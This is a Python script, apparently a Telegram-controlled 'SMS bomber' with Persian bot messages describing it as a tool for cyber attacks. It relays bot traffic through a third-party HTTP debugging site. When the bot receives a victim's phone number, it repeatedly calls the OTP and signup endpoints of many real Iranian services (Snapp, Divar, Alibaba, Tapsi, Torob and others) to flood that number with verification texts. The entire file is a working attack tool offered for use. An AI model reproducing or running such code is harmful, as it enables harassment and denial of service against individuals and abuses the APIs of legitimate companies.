import requests
from bs4 import BeautifulSoup
import json
import time
import platform
import subprocess
import wmi
from requests import post , get
from time import sleep


last_key=""
token = ""


def send_bot(message):

    url = (f"https://api.telegram.org/bot{token}/sendmessage?chat_id=391393431&text="+str(message))

    payload = {"UrlBox":url,

                "AgentList":"Mozilla Firefox",
                "VersionsList":"HTTP/1.1",
                "MethodList":"POST"
            }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)


def Start_cl():
    pm = f"""
    این بات 🤖
 برای بعضی از حملات سایبری کاربرد دارد
    ~~~~~~~~~~~~~
برای دیدن امکانات رویه /list کلیک کنید 😶

    """
    send_bot(pm)
    time.sleep(20)




def list_menu():
    pm = """خب خب. لیست دستورات من اینا هستن 😜

♨️   اس ام اس بمبر : /smsbomber  😉


برای ادامه فرایند روی دکمه /none کلیک کنید 😁"""

    send_bot(pm)
    time.sleep(20)


def key_bot():
    global last_key
    mydata = {"UrlBox":f"https://api.telegram.org/bot{token}/GetUpdates",
                "AgentList": "Internet Explorer",
                "VersionsList": "HTTP/1.1",
                "MethodList": "GET"
            }

    source = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",data=mydata).content.decode()

    soup = BeautifulSoup(source,"html.parser")

    find_tag = json.loads(str(soup.findAll("pre"))[61:-7])


    last_key = find_tag['result'][-1]['message']['text']









# append in sended:
#                     1 for site return code 200                 ok
#                     0 for site return code somting not 200     error
#                    -1 for internet error                       error
#                     2 for site mabey dont send bot return 200
sended = []

def smsbomber():
    pm = """خب خب. لیست دستورات من اینا هستن 😜

شماره تلفن را وارد کنید:

                        +98


برای ادامه فرایند روی دکمه /none کلیک کنید 😁"""

    send_bot(pm)
    time.sleep(20)


# dos loop

def start(phone_number,sms_number):
    looping_count = 0

    #sleep_number = int(input("[ ] Number of sms sent per second:\n>>"))

    while looping_count <= sms_number:

        if sended.count(1) >= sms_number:
            print("\n[ ] Done, I sent more than {} sms to +98 {}\n".format(sms_number, phone_number ))
            break

        else:

            looping_count = looping_count + 1

            # run site function'
            snap(phone_number)
            sleep(1)
            tamland(phone_number)
            sleep(1)
            alibaba(phone_number)
            sleep(.5)
            tapsi(phone_number)
            sleep(1)
            divar(phone_number)
            sleep(1)
            sbm24(phone_number)
            sleep(.5)
            anten(phone_number)
            sleep(1)
            snap_doctor(phone_number)
            sleep(1)
            togmond(phone_number)
            sleep(.5)
            torob(phone_number)
            sleep(1)
            limited_sites(phone_number)
            sleep(1)
            snap_room(phone_number)




            # sleep time after 1 looping
            #sleep(1)




###############                  ###############
###### site function     configs    start ######
###############                  ###############

# 001 snap
def snap(phone_number):
    try:
        phone_number = "+98" + phone_number
        data = {"cellphone":phone_number}
        url = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
        p = post(url, json=data, timeout=2)
        sleep(.01)

        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[snap] send post and : {}".format(p))

        else:
            print("[-snap] not send , error code:{}".format(p))
            sended.append(0)
    except:
        print("[-snap] not send check internet or somting..")
        sended.append(-1)



# 002 tamland
def tamland(phone_number):
    try:
        phone_number = "0" + phone_number


        data = {"Mobile":phone_number,"SchoolId":-1}
        url = "https://api.famiran.com/api/user/signup"
        p = post(url, json=data, timeout=2)
        sleep(.01)

        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[tamland] send post and : {}".format(p))

        else:
            print("[-tamland] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tamland] not send check internet or somting..")
        sended.append(-1)



# 003 alibaba
def alibaba(phone_number):
    try:
        phone_number = phone_number
        url = "https://ws.alibaba.ir/api/v3/account/mobile/otp"
        data = {"phoneNumber":phone_number}
        p = post(url, json=data, timeout=3)
        sleep(.01)

        rp = p.status_code
        if rp == 200 :
            sended.append(1)
            print("[alibaba] send post and : {}".format(p))

        else:
            print("[-alibaba] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-alibaba] not send check internet or somting..")
        sended.append(-1)

# 004 tapsi -limit
def tapsi(phone_number):
    try:
        phone_number = "0" + phone_number
        data = {"credential":{"phoneNumber":phone_number,"role":"PASSENGER"}}
        url = "https://tap33.me/api/v2/user"
        p = post(url, json=data, timeout=2 )
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[tapsi] send post and : {}".format(p))
        else:
            print("[-tapsi] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-tapsi] not send check internet or somting..")
        sended.append(-1)

# 005 divar
def divar(phone_number):
    try:
        phone_number = phone_number
        data = {"phone":phone_number}
        url = "https://api.divar.ir/v5/auth/authenticate"
        p = post(url, json=data, timeout=2)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[divar] send post and : {}".format(p))
        else:
            print("[-divar] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-divar] not send check internet or somting..")
        sended.append(-1)


# 006 sbm24 -limit
def sbm24(phone_number):
    try:
        data = {}
        url = "https://sandbox.sbm24.net/api/v2/authenticate/send-confirmation-code?mobile=0{}".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[sbm24] send post and : {}".format(p))
        else:
            print("[-sbm24] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-sbm24] not send check internet or somting..")
        sended.append(-1)



# 007 snap market
def snap_market(phone_number):
    try:

        data = {}
        url = "https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone=0{}&dummy=1603885783456".format(phone_number)
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[snap_market] send post and : {}".format(p))
        else:
            print("[-snap_market] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snap_market] not send check internet or somting..")
        sended.append(-1)



# 008 anten *
def anten(phone_number):
    try:
        phone_number = '0'+phone_number
        data = {"phone":phone_number}
        url = "https://api2.anten.ir/users/"
        p = post(url, json=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[anten] send post and : {}".format(p))
        else:
            print("[-anten] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-anten] not send check internet or somting..")
        sended.append(-1)


# 009 snap doctor *
def snap_doctor(phone_number):
    try:
        url = "https://core.snapp.doctor/Api/Common/v1/sendVerificationCode/0{}/sms?cCode=+98)".format(phone_number)
        p = get(url, timeout=3)
        rp = p.json()
        rp = rp["result"]
        sleep(.01)
        if rp == "SUCCESS":
            sended.append(1)
            print("[snap doctor] send get and : {}".format(rp))
    except:
        print("[-snap doctor] not send check internet or somting..")
        sended.append(-1)


# 010 togmond *
def togmond(phone_number):
    try:
        phone_number = phone_number
        data = "utf8=%E2%9C%93&phone_number=0{}".format(phone_number)
        url = "https://tagmond.com/phone_number"
        p = post(url, data=data, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(2) # for 10 try : dont send sms bot return 200!
            print("[togmond] send post and : {}".format(p))
        else:
            print("[-togmond] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-togmond] not send check internet or somting..")
        sended.append(-1)


# 011 torob
def torob(phone_number):
    try:
        url = "https://api.torob.com/a/phone/send-pin/?phone_number=0{}".format(phone_number)
        p = get(url, timeout=3)
        rp = p.status_code
        sleep(.01)
        if rp == 200:
            sended.append(1)
            print("[torob] send post and : {}".format(p))
        else:
            print("[-torob] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-torob] not send check internet or somting..")
        sended.append(-1)


# 012 lomited sites
def limited_sites(phone_number):
    try:
        data = {"username":phone_number}
        url = "https://www.tebinja.com/api/v1/users"
        post(url, json=data, timeout=1)
        sleep(.01)
    except:
        sended.append(2)

# 013 snap room
def snap_room(phone_number):
    try:
        data = {"username":"0"+phone_number}
        url = "https://napi.snapproom.com/users/self/verification-flow"
        p = post(url, json=data, timeout=2)
        sleep(.01)
        rp = p.status_code
        if rp == 200:
            sended.append(1)
            print("[snap room] send post and : {}".format(p))
        else:
            print("[-snap room] not send , error code: {}".format(p))
            sended.append(0)
    except:
        print("[-snap room] not send check internet or somting..")
        sended.append(-1)





Start_cl()

while True:
    key_bot()
    if last_key == "/list":
        list_menu()
    elif last_key == "/smsbomber":
         smsbomber()
    elif "09" in last_key:
        start(last_key,10)
